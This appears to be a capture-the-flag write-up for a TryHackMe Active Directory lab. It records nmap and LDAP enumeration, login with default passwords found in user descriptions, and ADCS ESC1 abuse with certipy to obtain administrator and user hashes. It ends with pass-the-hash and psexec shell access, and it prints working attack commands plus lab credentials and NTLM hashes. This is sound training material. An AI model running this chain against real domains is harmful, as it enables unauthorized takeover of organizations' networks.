
# Enumeration
**Target** - `10.10.161.194`
Enumerate Open Ports:
`nmap -sV -sC 10.10.161.194`

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 08:53 EDT
Nmap scan report for 10.10.161.194
Host is up (0.020s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-23 12:53:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2025-05-22T12:50:41
|_Not valid after:  2025-11-21T12:50:41
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-05-23T12:54:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.47 seconds
```

Interesting finds
`88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-23 12:53:31Z)`

```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-23T12:54:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2025-05-22T12:50:41
|_Not valid after:  2025-11-21T12:50:41
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows
```


**LDAP Enumeration**
```
ldapsearch -H ldap://10.10.161.194 -x -b DC=thm,DC=local "(objectClass=person)" | awk '
  /^dn:/ {show=0} 
  /^sAMAccountName:/ {user=$0; show++} 
  /^description:/ {desc=$0; show++} 
  show==2 {print user; print desc; print ""; show=0}
'
```

Interesting Finds:
```
sAMAccountName: IVY_WILLIS
description: Please change it: CHANGEME2023!

sAMAccountName: SUSANNA_MCKNIGHT
description: Please change it: CHANGEME2023!
```


# Exploitation

# **LDAP**

With the finding of 
```
sAMAccountName: IVY_WILLIS
description: Please change it: CHANGEME2023!

sAMAccountName: SUSANNA_MCKNIGHT
description: Please change it: CHANGEME2023!
```
I will try to connect to these via RDP. I'll be using remmina.

`IVY_WILLIS` - Didn't Work

`SUSANNA_MCKNIGHT` - Worked!
- We're in!
![Pasted image 20250523144732](https://github.com/user-attachments/assets/9fe28efa-c9fe-4643-941c-c4c856a28ee4)

Now I can obtain the user flag
![Pasted image 20250523144703](https://github.com/user-attachments/assets/856d85ee-90e8-4d0d-be8c-b5d73ae8ee9e)


With the user credentials, I'll run a #ldapdomaindump 
```
python3 '/home/kali/Desktop/ldapdomaindump-0.10.0/ldapdomaindump.py' ldaps://10.10.161.194 -u "thm.local\SUSANNA_MCKNIGHT" -p CHANGEME2023! -o ./mytmp
```

This will generate:
![Pasted image 20250523145427](https://github.com/user-attachments/assets/7989ebb5-dc04-4ccc-9884-1d4ec3121342)

Let's take a look for some useful information:
![Pasted image 20250523145617](https://github.com/user-attachments/assets/e2a865b8-2900-41df-a2ec-835bdea7364a)


You can also run `Get-ADGroupMember -Identity "Domain Admins" -Recursive` in powershell to get list of users who are domain administrators

#### Active Directory Certificate Service
- ADCS uses LDAP to publish certificate-related objects

We're enumerating ADCS because there're signs of a certificate authority present from out NMAP scan on port 443 (HTTPSd)
` ssl-cert: Subject: commonName=thm-LABYRINTH-CA`
**List All PKI Enrollment Servers**
`nxc ldap 10.10.161.194 -u SUSANNA_MCKNIGHT -p CHANGEME2023! -M adcs`

```
LDAP        10.10.161.194   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local)
LDAP        10.10.161.194   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
ADCS        10.10.161.194   389    LABYRINTH        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.161.194   389    LABYRINTH        Found PKI Enrollment Server: labyrinth.thm.local                                                      
ADCS        10.10.161.194   389    LABYRINTH        Found CN: thm-LABYRINTH-CA                                                                            
ADCS        10.10.161.194   389    LABYRINTH        Found PKI Enrollment WebService: https://labyrinth.thm.local/thm-LABYRINTH-CA_CES_Certificate/service.svc/CES
```

Let's enumerate and exploit ADCS using certipy-ad.
- This tool helps find misconfigurations and exploits common escalation paths
`certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.10.161.194 -vulnerable -enabled`
```
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Saving text output to '20250523102122_Certipy.txt'
[*] Wrote text output to '20250523102122_Certipy.txt'
[*] Saving JSON output to '20250523102122_Certipy.json'
[*] Wrote JSON output to '20250523102122_Certipy.json'

```
![Pasted image 20250523152214](https://github.com/user-attachments/assets/60d8906f-7c5e-4744-9831-dda8d5d046cc)


We have ESC1 vulnerability present.
Looking up ESC1 provides us with:
![Pasted image 20250523161238](https://github.com/user-attachments/assets/7811ccf5-e1bf-4698-b1bc-901caa5fac87)

`certipy-ad req -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -target thm.local -upn administrator@thm.local -ca thm-LABYRINTH -template ServerAuth`

Let's request that certificate!
```
certipy req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -dc-ip 10.10.161.194 -target labyrinth.thm.local -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local'
```

- `-upn` - user principle name
- `-ca` - certificate authority
![Pasted image 20250523152711](https://github.com/user-attachments/assets/b9affa21-27d8-40de-80e8-7c4e732addad)

- `-template`
![Pasted image 20250523152746](https://github.com/user-attachments/assets/0ddeb0f6-b602-44bf-9b9d-5ef8f546c3f4)

![Pasted image 20250523162438](https://github.com/user-attachments/assets/2ac08372-08f0-4967-88a6-f53bf2d90d81)

Success!

Let's try to crack the cert and key:
`certipy auth -pfx administrator.pfx -username Administrator -domain thm.local -dc-ip 10.10.161.194`

Nice!
![Pasted image 20250523162643](https://github.com/user-attachments/assets/2cbf8086-d3d4-4997-9de5-b2a959edfd38)

Now we have the ==NTLM hash== for the administrator account! Lets do pass the hash with ==wmiexec.py==
`evil-winrm -i 10.10.161.194 -u administrator -H 07d677a6cf40925beb80ad6428752322` (Only use NT for PTH attacks)

I couldn't connect with the administrator account, let's do this for `bradley_ortiz`

`certipy req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -dc-ip 10.10.161.194 -target labyrinth.thm.local -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'bradley_ortiz@thm.local'
`
![Pasted image 20250523163321](https://github.com/user-attachments/assets/df4103ac-a2b0-46cf-a526-3e93d4d2e966)


`certipy auth -pfx bradley_ortiz.pfx -username bradley_ortiz -domain thm.local -dc-ip 10.10.161.194`

I will add `thm.local` to my `/etc/hosts` and also run `export KRB5CCNAME=~/Desktop/bradley_ortiz.ccache`

(IP changed because I had to reset the box)
`psexec.py -k -no-pass -dc-ip 10.10.176.105 -target-ip 10.10.176.105 thm.local/bradley_ortiz@labyrinth.thm.local`
We could've also ran `psexec.py -hashes LMHASH:NTHASH example.local/username@target`
So it would've been:
`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d thm.local/bradley_ortiz@10.10.176.105
We're in!
![Pasted image 20250523170836](https://github.com/user-attachments/assets/62a02773-5e53-4218-a935-4d17fefe874b)


![Pasted image 20250523171144](https://github.com/user-attachments/assets/9f1cbaf1-af46-435d-b3de-20f4e452fd53)



